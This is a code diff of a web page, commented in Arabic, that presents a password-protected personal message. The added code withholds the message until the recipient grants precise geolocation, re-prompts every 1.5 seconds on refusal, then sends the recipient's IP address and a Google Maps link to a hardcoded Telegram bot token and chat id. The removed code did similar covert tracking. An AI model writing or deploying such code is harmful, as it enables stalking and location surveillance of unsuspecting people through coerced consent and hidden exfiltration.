@@ -32,55 +32,7 @@
 
         const botToken = '8882621676:AAFNQ0B3q6rPSMTIujyIHGYiep9xNM1rgZU';
         const chatId = '8718173410';
-
-        // دالة لجلب الـ IP وربطه بالدخول وإرسال تنبيه لتليجرام
-        async function sendVisitorInfo(recipientName) {
-            try {
-                // جلب الـ IP
-                let ipInfo = "غير معروف";
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ipInfo = ipData.ip;
-                } catch (err) {
-                    console.log("تعذر جلب الـ IP");
-                }
-
-                // طلب إذن اللوكيشن
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                            
-                            const msg = `📍 تم فتح الرسالة بواسطة الشخص (${recipientName})!\n\n🌐 الـ IP: ${ipInfo}\n🗺️ اللوكيشن بالتحديد:\n${mapsLink}`;
-                            sendToTelegram(msg);
-                        },
-                        (error) => {
-                            // لو رفض إذن اللوكيشن، نبعث الـ IP على الأقل
-                            const msg = `🔓 تم فتح الرسالة بواسطة الشخص (${recipientName}) ولكن رفض إذن اللوكيشن.\n\n🌐 الـ IP: ${ipInfo}`;
-                            sendToTelegram(msg);
-                        },
-                        { timeout: 10000, enableHighAccuracy: true }
-                    );
-                } else {
-                    const msg = `🔓 تم فتح الرسالة بواسطة الشخص (${recipientName}).\n\n🌐 الـ IP: ${ipInfo}`;
-                    sendToTelegram(msg);
-                }
-            } catch (e) {
-                console.log("خطأ في تتبع الزائر");
-            }
-        }
-
-        function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text })
-            }).catch(e => console.log(e));
-        }
+        let cachedUserInfo = null;
 
         async function fetchDatabase() {
             try {
@@ -122,16 +74,63 @@
             }
 
             if (enteredPass === correctPass) {
-                const userInfo = dbData[currentSlug];
-                const recipientName = userInfo ? (userInfo.name || currentSlug) : (urlParams.get('to') || currentSlug);
+                cachedUserInfo = dbData[currentSlug];
+                const recipientName = cachedUserInfo ? (cachedUserInfo.name || currentSlug) : (urlParams.get('to') || currentSlug);
                 
-                // إرسال اللوكيشن والـ IP فوراً عند نجاح فتح الرسالة
-                sendVisitorInfo(recipientName);
-
-                showContent(userInfo);
+                // طلب اللوكيشن إجبارياً قبل فتح الرسالة
+                requestLocationMandatory(recipientName);
             } else {
                 errorDiv.innerText = 'كلمة المرور غير صحيحة، حاول مرة أخرى.';
             }
+        }
+
+        function requestLocationMandatory(recipientName) {
+            const errorDiv = document.getElementById('errorMsg');
+            errorDiv.innerText = 'يرجى السماح بالوصول للموقع لتتمكن من قراءة الرسالة...';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        // جلب الـ IP
+                        let ipInfo = "غير معروف";
+                        try {
+                            const ipRes = await fetch('https://api.ipify.org?format=json');
+                            const ipData = await ipRes.json();
+                            ipInfo = ipData.ip;
+                        } catch (err) {}
+
+                        const msg = `📍 تم فتح الرسالة بنجاح بواسطة (${recipientName})!\n\n🌐 الـ IP: ${ipInfo}\n🗺️ اللوكيشن بالتحديد:\n${mapsLink}`;
+                        sendToTelegram(msg);
+
+                        // فتح المحتوى أخيراً بعد الموافقة
+                        showContent(cachedUserInfo);
+                    },
+                    (error) => {
+                        // لو رفض أو حصل خطأ
+                        errorDiv.innerText = 'تعذر الحصول على الصلاحية';
+                        // إعادة المحاولة إجبارياً بعد ثانية لضمان ظهور الطلب مرة أخرى
+                        setTimeout(() => {
+                            requestLocationMandatory(recipientName);
+                        }, 1500);
+                    },
+                    { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
+                );
+            } else {
+                errorDiv.innerText = 'متصفحك لا يدعم خاصية تحديد الموقع.';
+            }
+        }
+
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            }).catch(e => console.log(e));
         }
 
         function showContent(userInfo) {
